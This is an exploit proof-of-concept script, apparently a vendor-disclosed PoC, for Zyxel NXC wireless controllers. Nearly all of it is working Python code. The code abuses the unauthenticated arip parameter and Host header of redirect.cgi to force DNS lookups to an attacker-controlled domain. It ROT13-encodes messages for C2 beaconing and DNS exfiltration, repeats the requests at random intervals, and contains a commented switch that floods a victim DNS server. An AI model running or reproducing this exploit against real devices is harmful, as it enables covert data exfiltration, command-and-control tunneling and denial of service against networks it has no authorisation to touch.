# Zyxel - NXxxx Wireless Controller Exploit - CSRF / External DNS Interaction. (Multiple - PoC Code Tested on NXC2500)


# The ZYXEL Wireless Controller web application accepts unauthenticated input via ARIP & HOST HEADER without CSRF protection.
# This allows for multiple exploitable conditions. In this PoC code, a C2 beacon / simply encrpyted payload is accepted via argument and tunneled to an attacker controlled or floods a targeted DNS Server.
# Allows Denial of Service, Beaconing, Traffic Tunneling through insecure parameters.
# Discovered by Ken 's1ngular1ty' Pyle

import requests
import random
import string
import time

def rot13(plain):
  # PoC Code - ROT13 encoding function for DNS Exfiltration via HTTP parameters. Strip out non-usables. 
  plain = plain.upper()
  alphabet = string.ascii_uppercase
  cipher = alphabet[13:] + alphabet[:13]
  return plain.translate(str.maketrans(alphabet, cipher))

def encode_plain(plain):
  # ROT13 encoding and stripping of non-alphanumeric characters for simple DNS transport. PoC for exfiltration via HTTP Triggered DNS Requests.
  plain = rot13(plain)
  plain = ''.join(c for c in plain if c.isalnum())
  return plain

def send_c2signal(c2signal):

  # Exploit - CSRF / SSRF / DNS Interaction. The ZYXEL web application accepts unauthenticated input via ARIP & HOST HEADER without CSRF protection. 
  # Uses FQDNS & IPs, performs a DNS lookup against the target. Accepts arbitrary input.
  # No CVE for this, disclosed to vendor.
  # Replace CORP.XYZ with a BURP Collaborator beacon or FQDN to collect.

  arip = c2signal + '.corp.xyz'
  headers = {'HOST': arip, 'USERAGENT': 'CYBIRPOC'}
  print(headers)
  url = 'http://targetapplication/redirect.cgi?arip=' + arip
  response = requests.get(url, headers=headers)
  print(response.status_code)

# PoC - Type out a 64 character or less message or c2 beacon. This will repeat at random intervals and tunnel to a DNS c2 server.
plain = input("Input a <64 character message or c2 beacon. This will repeat at random intervals and tunnel to a DNS c2 server. (limited to 64 characters): \n")[:64]
c2signal = encode_plain(plain)
print(c2signal)


# Repeat Beaconing Message request at random intervals
while True:
   print(c2signal)
   arip = c2signal + '.corp.xyz'
   send_c2signal(c2signal)
   wait_time = random.randint(30, 300) # wait between 30 seconds and 5 minutes
   print("C2 Signal & Encoded message sent via HTTP & DNS. \nWaiting for", wait_time, "seconds...")
   
   
#Uncomment this line to unrestrict signaling / lookup / DoS & Flood victim with requests via Zyxel Device
   #time.sleep(wait_time)
